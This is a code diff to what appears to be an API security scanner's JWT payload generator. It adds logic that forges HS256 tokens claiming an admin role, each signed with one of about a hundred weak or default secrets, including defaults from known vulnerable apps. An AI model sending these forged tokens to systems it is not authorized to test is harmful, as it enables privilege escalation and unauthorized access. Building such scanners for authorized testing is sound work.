@@ -1,6 +1,8 @@
 package payloads
 
 import (
+	"crypto/hmac"
+	"crypto/sha256"
 	"encoding/base64"
 	"strings"
 
@@ -44,8 +46,20 @@ func (g *JWTGenerator) Generate(endpoint types.Endpoint, param *types.Parameter)
 	return payloads
 }
 
-// isJWTRelevant checks if parameter might contain JWT tokens
+// isJWTRelevant checks if parameter might contain JWT tokens.
+//
+// If the endpoint already has an Authorization header parameter (e.g.
+// synthesized by the parser), JWT payloads should only be generated for
+// that parameter to avoid duplicates and mis-positioned payloads.
 func (g *JWTGenerator) isJWTRelevant(param *types.Parameter, endpoint types.Endpoint) bool {
+	// If the endpoint has an explicit Authorization header parameter,
+	// only generate JWT payloads for that specific parameter.
+	if hasAuthorizationHeader(endpoint) {
+		return param.In == "header" && strings.EqualFold(param.Name, "Authorization")
+	}
+
+	// No Authorization header parameter exists — fall back to broad matching
+	// but mark this with metadata so the generator can override position.
 	nameLower := strings.ToLower(param.Name)
 	pathLower := strings.ToLower(endpoint.Path)
 
@@ -80,6 +94,29 @@ func (g *JWTGenerator) isJWTRelevant(param *types.Parameter, endpoint types.Endp
 		return true
 	}
 
+	// Check if endpoint has bearer auth configured (e.g., from OpenAPI securitySchemes)
+	if endpoint.Auth != nil && (endpoint.Auth.Type == "bearer" || endpoint.Auth.Type == "oauth2") {
+		return true
+	}
+
+	// Check for common authenticated API path patterns (excluding overly broad matches like /api/ and /users/)
+	authPaths := []string{"/admin/", "/protected/", "/account/", "/profile/"}
+	for _, ap := range authPaths {
+		if strings.Contains(pathLower, ap) {
+			return true
+		}
+	}
+
+	return false
+}
+
+// hasAuthorizationHeader checks whether the endpoint has an Authorization header parameter.
+func hasAuthorizationHeader(endpoint types.Endpoint) bool {
+	for _, p := range endpoint.Parameters {
+		if strings.EqualFold(p.Name, "Authorization") && strings.EqualFold(p.In, "header") {
+			return true
+		}
+	}
 	return false
 }
 
@@ -214,50 +251,80 @@ func (g *JWTGenerator) claimManipulationPayloads() []Payload {
 	return payloads
 }
 
+// signHS256 creates a valid HS256-signed JWT with the given secret
+func signHS256(headerB64, payloadB64, secret string) string {
+	signingInput := headerB64 + "." + payloadB64
+	mac := hmac.New(sha256.New, []byte(secret))
+	mac.Write([]byte(signingInput))
+	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
+	return signingInput + "." + sig
+}
+
 // weakSecretPayloads generates payloads for testing weak JWT secrets
 func (g *JWTGenerator) weakSecretPayloads() []Payload {
-	// These JWTs are signed with common weak secrets for testing
-	// Server should reject them if using proper secrets
-	return []Payload{
-		{
-			// Signed with "secret"
-			Value:       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.7h9opGKvKk1vTmEv-x-0Wy3KaW7RQXQ9f_XzlwXbGQM",
-			Type:        types.AttackJWT,
-			Category:    "authentication",
-			Description: "JWT signed with weak secret 'secret'",
-			Metadata:    map[string]string{"attack": "weak_secret", "secret": "secret"},
-		},
-		{
-			// Signed with "password"
-			Value:       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.vJfaWsJjq2yxs4FZ8EfLQ3Y_5O7A0fnEpCFz8N6RJHI",
-			Type:        types.AttackJWT,
-			Category:    "authentication",
-			Description: "JWT signed with weak secret 'password'",
-			Metadata:    map[string]string{"attack": "weak_secret", "secret": "password"},
-		},
-		{
-			// Signed with "123456"
-			Value:       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.PeKP-C8fJf-XC5_P8yNT6tN1E1F-Q4Dp5L8Q2T_Qx8s",
-			Type:        types.AttackJWT,
-			Category:    "authentication",
-			Description: "JWT signed with weak secret '123456'",
-			Metadata:    map[string]string{"attack": "weak_secret", "secret": "123456"},
-		},
-		{
-			// Signed with empty string
-			Value:       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.OPHUTcLVfJ6M1C0WuPm9HmQ1SJp2-8P6aM0Ei1P0TXU",
-			Type:        types.AttackJWT,
-			Category:    "authentication",
-			Description: "JWT signed with empty secret",
-			Metadata:    map[string]string{"attack": "weak_secret", "secret": "empty"},
-		},
-		{
-			// Signed with "key"
-			Value:       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.GdT-3JqeI9sBPmV7RK4Ol0I2LJ_r2O8x1_5vDWJ5H5g",
-			Type:        types.AttackJWT,
-			Category:    "authentication",
-			Description: "JWT signed with weak secret 'key'",
-			Metadata:    map[string]string{"attack": "weak_secret", "secret": "key"},
-		},
+	headerB64 := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))
+	claimsB64 := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"1","role":"admin","iat":1516239022}`))
+
+	weakSecrets := []string{
+		// Original entries
+		"secret", "password", "123456", "", "key",
+		// Application defaults
+		"super_secret", "supersecret", "super-secret",
+		"my_secret", "mysecret", "my-secret",
+		"jwt_secret", "jwtsecret", "jwt-secret",
+		"app_secret", "appsecret", "app-secret",
+		"secret_key", "secretkey", "secret-key",
+		"private_key", "privatekey", "private-key",
+		"signing_key", "signingkey", "signing-key",
+		"token_secret", "tokensecret", "token-secret",
+		// Framework defaults
+		"change_me", "changeme", "change-me",
+		"please_change", "pleasechange",
+		"default", "default_secret",
+		"example", "example_secret",
+		"test", "testing", "test123",
+		"development", "dev", "dev_secret",
+		"production",
+		// Common passwords used as secrets
+		"admin", "administrator",
+		"password123", "pass123", "p@ssw0rd",
+		"letmein", "welcome",
+		"1234567890", "12345678",
+		"qwerty", "abc123",
+		// VAmPI and known vulnerable app secrets
+		"vampi_secret", "vampi",
+		"flask_secret", "flask-secret",
+		"django-insecure-secret", "django_secret",
+		"node_secret", "express_secret",
+		// Single words commonly used
+		"auth", "token", "jwt", "api",
+		"secure", "security",
+		"master", "root",
+		"access", "private",
+		// Additional common single-word secrets
+		"random", "none", "null", "true", "false",
+		"1234", "pass", "login", "user",
+		"secret1", "key1",
+		"iloveyou", "monkey", "dragon", "shadow",
+		"sunshine", "trustno1", "hunter2", "hello",
+		"MyS3cr3t", "s3cr3t", "P@ssw0rd",
 	}
+
+	var payloads []Payload
+	for _, s := range weakSecrets {
+		desc := "JWT signed with weak secret '" + s + "'"
+		metaSecret := s
+		if s == "" {
+			desc = "JWT signed with empty secret"
+			metaSecret = "empty"
+		}
+		payloads = append(payloads, Payload{
+			Value:       signHS256(headerB64, claimsB64, s),
+			Type:        types.AttackJWT,
+			Category:    "authentication",
+			Description: desc,
+			Metadata:    map[string]string{"attack": "weak_secret", "secret": metaSecret},
+		})
+	}
+	return payloads
 }
